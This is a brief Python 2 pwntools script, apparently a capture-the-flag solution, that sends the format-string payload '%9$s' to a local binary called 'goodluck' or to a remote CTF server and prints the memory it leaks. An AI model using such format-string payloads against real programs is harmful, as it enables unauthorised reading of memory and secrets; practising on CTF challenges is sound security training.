#!/usr/bin/env python
from pwn import *
context.log_level = 'debug'
goodluck = ELF('./goodluck')
local = 1
if local:
    p = process('./goodluck')
else:
    p = remote('pwn.sniperoj.cn', 30017)
payload = "%9$s"
print payload
# gdb.attach(sh)
p.sendline(payload)
print p.recvall()
p.close()
